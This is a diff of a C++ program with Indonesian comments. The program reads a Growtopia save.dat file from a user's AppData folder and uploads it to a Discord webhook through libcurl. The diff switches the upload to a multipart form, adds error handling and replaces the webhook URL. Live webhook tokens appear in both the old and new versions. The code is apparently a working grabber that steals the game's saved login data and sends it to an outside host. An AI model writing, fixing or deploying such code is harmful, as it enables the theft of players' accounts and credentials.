@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <string>
 #include <curl/curl.h>
 
 size_t write_data(void* ptr, size_t size, size_t nmemb, std::string* data) {
@@ -9,48 +10,61 @@ size_t write_data(void* ptr, size_t size, size_t nmemb, std::string* data) {
 
 int main() {
     // Ganti dengan path folder dan nama file.dat Anda
-    std::string file_path ="C:\\Users\\Lenovo\\AppData\\Local\\Growtopia\\save.dat";
+    std::string file_path = "C:\\Users\\Lenovo\\AppData\\Local\\Growtopia\\save.dat";
 
     // Ganti dengan URL webhook Discord Anda
-    std::string webhook_url = "https://discordapp.com/api/webhooks/1190529769230581760/lLlFXBXGQZSKi6Sf2tJXoPGBnsNJUAh3N3ggMedHJtTzG_pjvvQj_pJnCfkCwIsEr2pn";
+    std::string webhook_url = "https://discord.com/api/webhooks/1310123751849066526/B5Kv687C3vlhOFvU0BO0bwXx28xq66fOBNUKnXTqclhy8Txwbn0gPVmwLbj8B2cyBTF8";
 
     std::ifstream file(file_path, std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Error: Tidak dapat membuka file.dat." << std::endl;
+        return 1;
+    }
 
-    if (file.is_open()) {
-        std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-        file.close();
+    // Membaca file ke dalam string (hanya untuk memastikan file dapat dibaca)
+    std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
 
-        CURL* curl;
-        CURLcode res;
+    // Inisialisasi cURL
+    CURL* curl;
+    CURLcode res;
 
-        curl = curl_easy_init();
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
 
-        if (curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, file_content.c_str());
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-            std::string response_body;
+    if (curl) {
+        // Membuat file part untuk multipart/form-data
+        struct curl_httppost* formpost = nullptr;
+        struct curl_httppost* lastptr = nullptr;
 
-            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
+        // Menambahkan file sebagai part dalam form-data
+        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, file_path.c_str(), CURLFORM_END);
 
-            res = curl_easy_perform(curl);
+        // Mengatur URL webhook Discord
+        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 
-            if (res != CURLE_OK) {
-                std::cerr << "Error: " << curl_easy_strerror(res) << std::endl;
-            }
-            else {
-                std::cout << "File.dat berhasil dikirim ke Discord melalui webhook." << std::endl;
-            }
+        // Menangani respon dari server
+        std::string response_body;
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
 
-            curl_easy_cleanup(curl);
+        // Melakukan request POST
+        res = curl_easy_perform(curl);
+
+        if (res != CURLE_OK) {
+            std::cerr << "Error: " << curl_easy_strerror(res) << std::endl;
+        }
+        else {
+            std::cout << "File berhasil dikirim ke Discord melalui webhook." << std::endl;
+            std::cout << "Response: " << response_body << std::endl;
         }
 
-    }
-    else {
-        std::cerr << "Error: Tidak dapat membuka file.dat." << std::endl;
+        // Bersihkan form dan curl
+        curl_formfree(formpost);
+        curl_easy_cleanup(curl);
     }
 
     curl_global_cleanup();
-
     return 0;
 }
